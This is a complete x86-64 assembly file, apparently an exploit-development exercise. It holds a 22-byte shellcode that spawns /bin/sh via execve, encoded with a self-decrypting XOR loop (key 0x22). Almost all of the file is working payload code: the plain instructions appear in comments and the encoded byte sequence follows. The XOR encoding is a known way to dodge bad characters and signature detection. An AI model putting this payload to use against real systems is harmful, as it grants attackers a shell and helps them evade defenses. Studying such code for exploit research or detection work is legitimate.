;; original shellcode for execve("/bin//sh", 0, 0) in 22 bytes. each byte in
;; this shellcode is XOR'ed with 0x22 to create the byte sequence seen in the
;; bottom of this file, which can then later be reconstructed in a loop.

; bits 64
;   xor esi, esi   ; rsi = NULL.
;   push rsi       ; null-terminate string on stack.
;
;   mov rax, 0x68732f2f6e69622f ; push "/bin//sh".
;   push rax
;
;   push rsp
;   pop rdi        ; rdi = "/bin//sh\0".
;
;   push byte 59   ; syscall execve.
;   pop rax
;
;   cdq            ; rdx = NULL.
;
;   syscall
  

bits 64
  ; if we do not assume rax holds address of the shellcode upon entry, we
  ; can use an extra 13 bytes to obtain rip as such:
  ; lea rax, [rel .decode_loop - 0x22222222]
  ; add rax, 0x22222222

%define key 0x22
.decode_loop:
  lea rax, [rax + 1] ; rax holds address of shellcode upon entry.
  xor [rax + 0x8], byte key
  db 0x75, (0xf6 ^ key) ; this becomes `jne .decode_loop` after the first xor.

  ; below sequence becomes sh-popping shellcode after above loop terminates.
  db 0x31 ^ key, 0xf6 ^ key, 0x56 ^ key, 0x48 ^ key, 0xb8 ^ key, 0x2f ^ key, \
     0x62 ^ key, 0x69 ^ key, 0x6e ^ key, 0x2f ^ key, 0x2f ^ key, 0x73 ^ key, \
     0x68 ^ key, 0x50 ^ key, 0x54 ^ key, 0x5f ^ key, 0x6a ^ key, 0x3b ^ key, \
     0x58 ^ key, 0x99 ^ key, 0x0f ^ key, 0x05 ^ key
  ; this key is here to terminate the .foo loop, since key ^ key = 0.
  db key
